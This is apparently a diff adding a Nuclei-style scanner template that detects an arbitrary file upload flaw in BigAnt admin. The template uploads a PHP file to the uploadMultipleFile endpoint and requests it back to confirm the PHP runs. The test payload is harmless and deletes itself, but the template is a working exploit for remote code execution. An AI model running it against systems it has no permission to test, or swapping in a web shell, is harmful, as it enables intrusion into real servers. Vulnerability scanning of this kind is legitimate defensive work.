@@ -1,0 +1,51 @@
+id: bigant-admin-uploadmultiplefile-anyfile-upload
+info:
+  name: BigAnt-Admin uploadMultipleFile Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  time: "{{date_time('%Y-%m-%d')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Addin/Upload/uploadMultipleFile.html"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfyjX
+    body: |-
+      ------WebKitFormBoundary1zY65etyNeQDfyjX
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundary1zY65etyNeQDfyjX--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "\"savefile\":\".*/(?P<file>.*?).php"
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/data/0/admin/{{time}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
